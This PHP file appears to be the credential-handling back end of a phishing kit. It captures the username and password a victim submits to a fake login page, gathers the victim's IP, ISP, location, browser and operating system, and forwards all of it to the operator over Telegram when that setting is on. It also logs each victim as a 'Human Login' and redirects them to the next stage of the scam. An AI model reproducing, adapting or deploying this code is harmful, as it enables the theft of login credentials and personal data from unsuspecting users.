<?php
session_start();

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include 'functions/Result.php'; // Include necessary functions

// Store POST data in session variables
storeSessionData($_POST);

// Process POST request if method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handlePostRequest();
} else {
    // If the request method is not POST, redirect to error page
    redirectToErrorPage("99dea78007133396a7b8ed70578ac6ae");
}

// Function to handle the POST request
function handlePostRequest() {
    if (isset($_SESSION['username'])) {
        if (empty($_SESSION['passwordlogin'])) {
            redirectToErrorPage("dc647eb65e6711e155375218212b3964");
        } else {
            processLogin();
        }
    } else {
        redirectToErrorPage("99dea78007133396a7b8ed70578ac6ae");
    }
}

// Function to store POST data in session variables
function storeSessionData($postData) {
    $_SESSION['username'] = $postData['userid'] ?? '';
    $_SESSION['passwordlogin'] = $postData['passcode'] ?? '';
}

// Function to redirect to an error page with a specified error code
function redirectToErrorPage($errorCode) {
    header("Location: ?infoPage=$errorCode&error=true");
    exit;
}

// Function to process the login after validation
function processLogin() {
    global $ip, $connectionisp, $countryname, $countrycode, $regioncity, $citykota, $os, $br, $settings;

    // Send the login result to Telegram if enabled
    if (!empty($settings['resulttotele']) && $settings['resulttotele'] === 'on') {
        sendLoginResultToTelegram();
    }

    // Log the activity and total login data
    logActivity("Human Login");
    logTotalLogin("Input Login");

    // Redirect to the next page
    header("Location: ap?infoPage=d9d1e60e50119d9752001d4196ee6b3c");
    exit;
}

// Function to send login result to Telegram
function sendLoginResultToTelegram() {
    global $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os;
    sendResult(generateLoginMessage(
        $_SESSION['username'], $_SESSION['passwordlogin'], date('l d F H:i:s'), 
        $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os
    ));
}

// Function to log activity
function logActivity($action) {
    global $countryname, $ip, $br, $os;
    file_put_contents("logs/activity.txt", "|" . date("l d F H:i:s") . "|$countryname|$ip|$br|$os|$action\n", FILE_APPEND);
}

// Function to log total login
function logTotalLogin($action) {
    global $countryname, $ip, $br, $os;
    file_put_contents("logs/total_login.txt", "|" . date("l d F H:i:s") . "|$countryname|$ip|$br|$os|$action\n", FILE_APPEND);
}
?>